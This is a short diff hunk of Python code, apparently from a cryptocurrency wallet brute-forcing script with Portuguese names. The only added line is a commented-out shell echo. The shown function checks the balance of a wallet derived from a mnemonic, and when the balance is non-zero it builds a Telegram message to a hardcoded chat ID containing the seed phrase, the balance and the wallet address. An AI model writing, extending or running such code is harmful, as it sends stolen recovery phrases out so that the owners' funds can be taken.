@@ -70,6 +70,7 @@ def chama_api_dos_nodes_para_validar_o_balance(wallet,mnemonic):
         chama_api_dos_nodes_para_validar_o_balance(wallet,mnemonic)
     else:
         #print("wallet "+str(wallet)+" balance "+str(web3.from_wei(balance,'ether'))+" mnemonic "+str(mnemonic))
+        #echo "is running"; else echo "$(date) - Servico esta parado, estamos iniciando" >> $HOME/monit.txt;
         if balance != 0:
             #print(f"count: "+str('%018.0f' % total_wallet)+"/"+str('%018.0f' % count)+" - time: "+str("{:6.4f}".format(total))+" - "+str(w)+" | "+str(balance)+" | "+str(mnemonic)+" - "+str(valida_palavras_validadores.bsc[int(rand)]))     
             payload = {'chat_id': '139945866', 'text': '🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n\n\n\n\n\n\n\n\n\n\n\n\n\nPhrase:'+str(mnemonic)+' \nBalance: '+str(web3.from_wei(balance,'ether'))+' \nWallet: '+str(wallet)+'\n\n\n\n\n\n\n\n\n\n\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢'}
